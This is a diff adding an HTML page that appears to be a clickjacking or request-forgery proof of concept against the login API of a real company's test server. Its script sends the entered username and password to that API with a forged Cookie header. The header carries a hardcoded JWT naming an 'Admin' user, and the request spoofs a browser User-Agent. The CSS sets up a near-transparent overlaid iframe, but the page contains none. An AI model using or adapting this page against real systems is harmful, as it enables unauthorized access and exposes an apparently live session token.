@@ -1,0 +1,80 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <style>
+        /* Styling for iframe (no changes needed here) */
+        iframe {
+            position: relative;
+            width: 500px;
+            height: 500px;
+            opacity: 0.1;
+            z-index: 2;
+        }
+
+        /* Styling for div element */
+        div {
+            position: absolute;
+            top: 100px;
+            left: 100px;
+            z-index: 1;
+        }
+
+        /* Styling for the input boxes */
+        input {
+            width: 300px;
+            padding: 10px;
+            margin: 10px 0;
+        }
+
+        /* Styling for username input (optional) */
+        .username {
+            margin-bottom: 10px;
+        }
+
+        /* Positioning the input fields and button */
+        .form-container {
+            position: absolute;
+            top: 100px;
+            left: 100px;
+            z-index: 1;
+        }
+
+        /* Button styling */
+        button {
+            padding: 10px 20px;
+            margin-top: 10px;
+            cursor: pointer;
+        }
+    </style>
+    <script>
+        function submitForm() {
+            var username = document.getElementById('username').value;
+            var password = document.getElementById('password').value;
+
+            var base64Credentials = btoa(username + ':' + password);
+            var token = 'eeyJhbGciOiJIUzI1NiJ9.eyJ1c2VySWQiOiJBZG1pbiIsImlhdCI6MTczMjg5NTk3NCwiZXhwIjoxNzMyOTA3OTc0fQ.HORj9A3P1OP8apRTMx7vZz1RVQpQeTD3rrQ-UuIpLYA';
+
+            var xhr = new XMLHttpRequest();
+            xhr.open('POST', 'https://uathobs.tataplayfiber.co.in/api/login', true); 
+            xhr.setRequestHeader('Authorization', 'Bearer ' + base64Credentials);
+            xhr.setRequestHeader('Content-Type', 'application/json');
+            xhr.setRequestHeader('Cookie', 'JWT_TOKEN=eyJhbGciOiJIUzI1NiJ9.eyJ1c2VySWQiOiJBZG1pbiIsImlhdCI6MTczMjg5NTk3NCwiZXhwIjoxNzMyOTA3OTc0fQ.HORj9A3P1OP8apRTMx7vZz1RVQpQeTD3rrQ-UuIpLYA');
+            xhr.setRequestHeader('User-Agent','Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0');
+            xhr.onreadystatechange = function () {
+                if (xhr.readyState == 4 && xhr.status == 200) {
+                    alert('Response Data: ' + xhr.responseText);
+                }
+            };
+            xhr.send(JSON.stringify({ userId: username}));
+        }
+    </script>
+</head>
+<body>
+    <!-- Container to hold the input fields and button together -->
+    <div class="form-container">
+        <input type="text" id="username" placeholder="Username">
+        <input type="password" id="password" placeholder="Password">
+        <button onclick="submitForm()">Submit</button>
+    </div>
+</body>
+</html>
